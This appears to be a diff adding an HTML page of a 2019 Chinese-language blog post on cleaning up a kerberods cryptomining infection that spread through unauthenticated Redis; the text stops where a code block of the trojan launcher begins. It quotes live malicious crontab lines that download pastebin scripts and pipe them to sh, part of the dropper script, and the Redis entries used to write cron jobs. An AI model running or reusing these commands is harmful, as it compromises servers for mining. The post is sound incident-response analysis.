@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"minminmsn.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="参考文档 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;94237.html https:&#x2F;&#x2F;www.4hou.com&#x2F;vulnerable&#x2F;13843.html https:&#x2F;&#x2F;laucyun.com&#x2F;17e194c26e4554cab975aae760bad553.html 现象 服务器CPU飙升 故障时间2019.4.10 17:50 top及htop查看信息只能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问及安全组漏洞招致kerberods来挖矿">
+<meta property="og:url" content="https://minminmsn.github.io/2019/04/12/2019/04/2019-04-12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E7%BB%84%E6%BC%8F%E6%B4%9E%E6%8B%9B%E8%87%B4kerberods%E6%9D%A5%E6%8C%96%E7%9F%BF/index/index.html">
+<meta property="og:site_name" content="MinMinMsn">
+<meta property="og:description" content="参考文档 https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;94237.html https:&#x2F;&#x2F;www.4hou.com&#x2F;vulnerable&#x2F;13843.html https:&#x2F;&#x2F;laucyun.com&#x2F;17e194c26e4554cab975aae760bad553.html 现象 服务器CPU飙升 故障时间2019.4.10 17:50 top及htop查看信息只能">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-04-12T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-26T07:06:31.653Z">
+<meta property="article:author" content="Jerry Min">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://minminmsn.github.io/2019/04/12/2019/04/2019-04-12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E7%BB%84%E6%BC%8F%E6%B4%9E%E6%8B%9B%E8%87%B4kerberods%E6%9D%A5%E6%8C%96%E7%9F%BF/index/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Redis未授权访问及安全组漏洞招致kerberods来挖矿 | MinMinMsn</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">MinMinMsn</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/12/2019/04/2019-04-12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E5%AE%89%E5%85%A8%E7%BB%84%E6%BC%8F%E6%B4%9E%E6%8B%9B%E8%87%B4kerberods%E6%9D%A5%E6%8C%96%E7%9F%BF/index/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Jerry Min">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MinMinMsn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Redis未授权访问及安全组漏洞招致kerberods来挖矿
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-04-12 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-12T08:00:00+08:00">2019-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>参考文档</strong> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/94237.html">https://www.freebuf.com/articles/web/94237.html</a> <a target="_blank" rel="noopener" href="https://www.4hou.com/vulnerable/13843.html">https://www.4hou.com/vulnerable/13843.html</a> <a target="_blank" rel="noopener" href="https://laucyun.com/17e194c26e4554cab975aae760bad553.html">https://laucyun.com/17e194c26e4554cab975aae760bad553.html</a></p>
+<p><strong>现象</strong> 服务器CPU飙升 故障时间2019.4.10 17:50 top及htop查看信息只能看到1个cpu信息，默认是4个</p>
+<p><strong>排错</strong> 排查发现crontab异常</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos ~]# crontab -l</span><br><span class="line">*/15 * * * * （curl -fsSL https://pastebin.com/raw/xmxHzu5P||wget -q -O- https://pastebin.com/raw/xmxHzu5P)|sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>先简单解决问题</strong> 重命名curl wget yum等工具，然后停止cron服务，删除crontab任务并禁锢cron任务中root文件，并修改host伪造pastebin.com解析，问题暂时得到了解决</p>
+<p><strong>然后分析问题</strong> 手工试了下这个脚本的威力，具体的也可以访问这个网站查看 <a target="_blank" rel="noopener" href="https://pastebin.com/raw/xmxHzu5P">https://pastebin.com/raw/xmxHzu5P</a> ，这里会木马启动文件&#x2F;usr&#x2F;sbin&#x2F;kerberods 后来网上查了下该病毒短时间内即造成大量 Linux 主机沦陷，它的传播方式分为三种，分别是： - 从 known_hosts 文件读取 IP 列表，用于登录信任该主机的其他主机，并控制它们执行恶意命令 - 利用 Redis 未授权访问和弱密码这两种常见的配置问题进行控制它们执行恶意命令 - 利用 SSH 弱密码进行爆破，然后控制它们执行恶意命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos tmp]# wgetold -q -O- https://pastebin.com/raw/xmxHzu5P</span><br><span class="line">export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /tmp</span><br><span class="line">chmod 1777 /tmp</span><br><span class="line">rm -rf /tmp/go.sh</span><br><span class="line">rm -rf /tmp/go2.sh</span><br><span class="line">ps -ef|grep -v grep|grep hwlh3wlh44lh|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep Circle_MI|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep get.bi-chi.com|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep hashvault.pro|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep nanopool.org|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/.sshd|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;xmr&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;xig&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;ddgs&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;qW3xT&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;wnTKYg&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;t00ls.ru&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;sustes&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;thisxxs&quot;|awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;hashfish&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kworkerds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;/tmp/devtool&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;systemctI&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kpsmouseds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kthrotlds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;kintegrityds&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps -ef|grep -v grep|grep &quot;suolbcc&quot;|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">ps aux|grep -v grep|grep -v khugepageds|awk &#x27;&#123;if($3&gt;=80.0) print $2&#125;&#x27;|xargs kill -9</span><br><span class="line">apt-get install curl -y||yum install curl -y||apk add curl -y</span><br><span class="line">apt-get install cron -y||yum install crontabs -y||apk add cron -y</span><br><span class="line">systemctl start crond</span><br><span class="line">systemctl start cron</span><br><span class="line">systemctl start crontab</span><br><span class="line">service </span><br></pre></td></tr></table></figure>
+
+<p><strong>查找当时哪些文件被修改了</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos / ]#find ./ -mtime -1 -type f  -exec ls -lt &#123;&#125; \; | grep &quot;17:50&quot;</span><br><span class="line">-rw-r--r-- 1 root root 9216 Apr 10 17:50 ./etc/pki/nssdb/cert9.dbold</span><br><span class="line">-rw-r--r-- 1 root root 11264 Apr 10 17:50 ./etc/pki/nssdb/key4.dbold</span><br><span class="line">-rw-r--r-- 1 root root 35773 Apr 10 17:50 ./etc/ld.so.cache</span><br><span class="line">-rw-r--r-- 1 root root 35773 Apr 10 17:50 ./etc/crond.d/tomcat</span><br><span class="line">-rw-r--r-- 1 root root 17 Apr 10 17:50 ./run/systemd/system/session-460352.scope</span><br><span class="line">-rw-r--r-- 1 root root 17 Apr 10 17:50 ./run/systemd/system/session-460351.scope</span><br><span class="line">-rw------- 1 root root 28903 Apr 10 17:50 ./var/cache/ldconfig/aux-cache</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 10 17:50 ./var/cache/yum/x86_64/7/timedhosts.txt</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 87 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/c/63b6311ebd291411c3e991f4266bb07031a53fad-curl-7.29.0-51.el7-x86_64/command_line</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 1 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 1 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 97 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/command_line</span><br><span class="line">-rw-r--r-- 1 root root 7 Apr 10 17:50 ./var/lib/yum/yumdb/n/77651d1cdf0adc19dafdecb490426f20e15f8554-nss-pem-1.0.3-5.el7_6.1-x86_64/from_repo</span><br><span class="line">-rw-r--r-- 3 root root 6 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/checksum_type</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/from_repo_revision</span><br><span class="line">-rw-r--r-- 1 root root 36 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/var_uuid</span><br><span class="line">-rw-r--r-- 2 root root 10 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/from_repo_timestamp</span><br><span class="line">-rw-r--r-- 1 root root 90 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/origin_url</span><br><span class="line">-rw-r--r-- 1 root root 64 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/checksum_data</span><br><span class="line">-rw-r--r-- 1 root root 5 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/var_infra</span><br><span class="line">-rw-r--r-- 3 root root 15 Apr 10 17:50 ./var/lib/yum/yumdb/l/28abae6a2a790b33d342f09c6eb881cff0b30f19-libcurl-7.29.0-51.el7-x86_64/command_line</span><br><span class="line">-rw-------. 1 root root 896000 Apr 10 17:50 ./var/lib/yum/history/history-2016-04-21.sqlite</span><br><span class="line">-rw-r--r-- 1 root root 3597 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/config-main</span><br><span class="line">-rw-r--r-- 1 root root 8391 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/config-repos</span><br><span class="line">-rw-r--r-- 1 root root 1722 Apr 10 17:50 ./var/lib/yum/history/2016-04-21/21/saved_tx</span><br><span class="line">-rw-------. 1 root root 33536 Apr 10 17:50 ./var/lib/yum/history/history-2016-04-21.sqlite-journal</span><br><span class="line">-rw-r--r-- 1 root root 45 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/version</span><br><span class="line">-rw-r--r-- 1 root root 2692 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/conflicts</span><br><span class="line">-rw-r--r-- 1 root root 3105 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/obsoletes</span><br><span class="line">-rw-r--r-- 1 root root 60927 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/pkgtups-checksums</span><br><span class="line">-rw-r--r-- 1 root root 23303 Apr 10 17:50 ./var/lib/yum/rpmdb-indexes/file-requires</span><br><span class="line">-rw-r--r--. 1 root root 12288 Apr 10 17:50 ./var/lib/rpm/Installtid</span><br><span class="line">-rw-r--r--. 1 root root 2273280 Apr 10 17:50 ./var/lib/rpm/Dirnames</span><br><span class="line">-rw-r--r--. 1 root root 40960 Apr 10 17:50 ./var/lib/rpm/Sigmd5</span><br><span class="line">-rw-r--r--. 1 root root 65536 Apr 10 17:50 ./var/lib/rpm/Sha1header</span><br><span class="line">-rw-r--r--. 1 root root 36864 Apr 10 17:50 ./var/lib/rpm/Name</span><br><span class="line">-rw-r--r--. 1 root root 73367552 Apr 10 17:50 ./var/lib/rpm/Packages</span><br><span class="line">-rw-r--r--. 1 root root 8192 Apr 10 17:50 ./var/lib/rpm/Conflictname</span><br><span class="line">-rw-r--r--. 1 root root 20480 Apr 10 17:50 ./var/lib/rpm/Group</span><br><span class="line">-rw-r--r--. 1 root root 188416 Apr 10 17:50 ./var/lib/rpm/Requirename</span><br><span class="line">-rw-r--r--. 1 root root 1617920 Apr 10 17:50 ./var/lib/rpm/Providename</span><br><span class="line">-rw-r--r--. 1 root root 3084288 Apr 10 17:50 ./var/lib/rpm/Basenames</span><br><span class="line">-rw------- 1 root root 161 Apr 10 17:50 ./var/log/yum.log</span><br></pre></td></tr></table></figure>
+
+<p><strong>发现问题文件</strong> 发现一个比较可疑的文件，文件当时没用删除是二进程形式，通过xxd能查看，大概如下内容，比较奇怪的是redis格式的，而且还有redis版本，后来谷歌发现redis无密码确实有被利用的风险</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos / ]#cat /etc/crond.d/tomcat</span><br><span class="line">REDIS 0008%09 redis-ver4.0.6 redis-bits 򳨭used-memq</span><br><span class="line">þ񱴮time@Gts󿿀򳨭eec¯used-memP</span><br><span class="line">*/15 * * * * root wget -q -O- https://pastebin.com/raw/v5XC0BJh|sh</span><br><span class="line">##</span><br><span class="line">caches@F</span><br><span class="line">*/10 * * * * root curl -fsSL https://pastebin.com/raw/v5XC0BJh|sh</span><br><span class="line">##</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用redis未授权漏洞复盘攻击过程</strong> 下面展示利用 Redis 未授权访问和弱密码这两种常见的配置问题进行控制它们执行恶意命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos ~]# redis-cli</span><br><span class="line">127.0.0.1:6379&gt; KEYS *</span><br><span class="line">1) &quot;runtime&quot;</span><br><span class="line">2) &quot;caches&quot;</span><br><span class="line">127.0.0.1:6379&gt; GET runtime</span><br><span class="line">&quot;\n*/15 * * * * wget -q -O- https://pastebin.com/raw/v5XC0BJh|sh\n##\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; get caches</span><br><span class="line">&quot;\n*/10 * * * * curl -fsSL https://pastebin.com/raw/v5XC0BJh|sh\n##\n&quot;</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line">127.0.0.1:6379&gt; DEL runtime</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; del caches</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; KEYS *</span><br><span class="line">(empty list or set)</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/var/spool/cron/crontabs&quot;</span><br><span class="line">127.0.0.1:6379&gt; CONFIG GET dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;root&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>检查known_host文件</strong> 挖矿病毒kerberods会暴力破解known_hosts里面主机的密码，还会扫描known_hosts主机是否对外开通6379端口，要是开放了redis端口可以利用redis远程执行漏洞，直接ssh免密登陆远程服务器继续扩散病毒 [root@VM_3_114_centos .ssh]# cat known_hosts</p>
+<p><strong>介绍kerberods木马</strong> - kerberods木马启动程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 